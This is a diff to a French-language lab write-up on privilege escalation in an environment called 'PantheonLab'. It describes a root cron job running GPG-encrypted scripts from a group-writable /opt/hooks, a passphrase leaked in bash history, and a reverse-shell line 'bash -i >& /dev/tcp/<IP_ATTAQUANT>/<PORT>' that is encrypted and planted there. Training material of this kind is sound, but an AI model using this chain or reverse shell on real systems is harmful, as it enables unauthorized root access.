@@ -2,7 +2,7 @@
 
 ## Introduction
 
-Cette section détaille les techniques d'élévation de privilèges utilisées dans l'environnement PantheonLab.
+Cette section détaille les techniques d'élévation de privilèges exploitées dans l'environnement PantheonLab.
 
 ## Méthodes d'Élévation de Privilèges
 
@@ -12,11 +12,23 @@ Dans cet environnement, l'utilisateur `hera` dispose de droits suffisants pour e
 
 #### Contexte
 
-Un dossier `/opt/hooks` contient des scripts qui sont automatiquement exécutés par l'utilisateur `root` via une tâche cron toutes les minutes. Cependant, ces scripts sont chiffrés avec GPG, ce qui semble empêcher une modification directe.
+L'utilisateur `hera` appartient au groupe `juno`, ce qui lui confère certains droits supplémentaires sur le système. On peut le vérifier avec la commande suivante :
+
+```bash
+groups hera
+```
+
+Le dossier `/opt/hooks` possède des droits d'accès pour le groupe `juno`, permettant ainsi à tout membre de ce groupe de modifier ou d'ajouter des fichiers dans ce dossier :
+
+```bash
+ls -ld /opt/hooks
+```
+
+Ce dossier contient des scripts automatiquement exécutés par l'utilisateur `root` via une tâche cron toutes les minutes. Cependant, ces scripts sont chiffrés avec GPG, ce qui semble empêcher une modification directe.
 
 #### Analyse du mécanisme
 
-En listant le contenu de `/opt/hooks`, on remarque la présence de scripts chiffrés (extension `.gpg`). Un examen plus approfondi du système révèle que le mot de passe utilisé pour le chiffrement GPG est stocké en clair dans le fichier `~/.bash_history` de l'utilisateur `hera`.
+En listant le contenu de `/opt/hooks`, on remarque la présence de scripts chiffrés (extension `.gpg`). Un examen plus approfondi du système révèle que le mot de passe utilisé pour le chiffrement GPG est stocké en clair dans le fichier `~/.bash_history` de l'utilisateur `hera` :
 
 ```bash
 cat ~/.bash_history
@@ -32,25 +44,29 @@ cat ~/.bash_history
    ```
 
 2. **Création d'un reverse shell** :
-   On commence par écrire un script bash qui ouvre un reverse shell vers notre machine d'attaque :
+   On écrit un script bash qui ouvre un reverse shell vers la machine d'attaque :
 
    ```bash
    bash -i >& /dev/tcp/<IP_ATTAQUANT>/<PORT> 0>&1
    ```
 
 3. **Chiffrement du script** :
-   On chiffre ce script avec GPG en utilisant le mot de passe récupéré :
+   On chiffre ce script avec GPG en utilisant le mot de passe récupéré. Pour automatiser et sécuriser le processus, on peut stocker temporairement le mot de passe dans un fichier protégé, puis le supprimer après usage :
 
    ```bash
-   gpg --symmetric --passphrase <mot_de_passe> reverseshell.sh
+   echo 'M0n@mourP0urZ3u$!2025' > pass.txt
+   chmod 600 pass.txt
+   gpg --batch --yes --passphrase-file pass.txt --symmetric reverseshell.sh
+   rm pass.txt
    ```
-   Cela génère un fichier `reverseshell.sh.gpg`.
+
+   Cela génère un fichier `reverseshell.sh.gpg` chiffré avec le mot de passe contenu dans `pass.txt`.
 
 4. **Dépôt dans /opt/hooks** :
    On place le fichier chiffré dans `/opt/hooks` :
 
    ```bash
-   cp reverseshell.sh.gpg /opt/hooks/
+   mv reverseshell.sh.gpg /opt/hooks/
    ```
 
 5. **Attente de l'exécution** :
@@ -58,7 +74,7 @@ cat ~/.bash_history
 
 #### Résumé
 
-Ce scénario montre l'importance de ne jamais stocker de mots de passe sensibles en clair, et de bien contrôler les scripts exécutés automatiquement avec des privilèges élevés.
+Ce scénario illustre l'importance de ne jamais stocker de mots de passe sensibles en clair et de bien contrôler les scripts exécutés automatiquement avec des privilèges élevés.
 
 ### 2. Techniques de Persistance
 
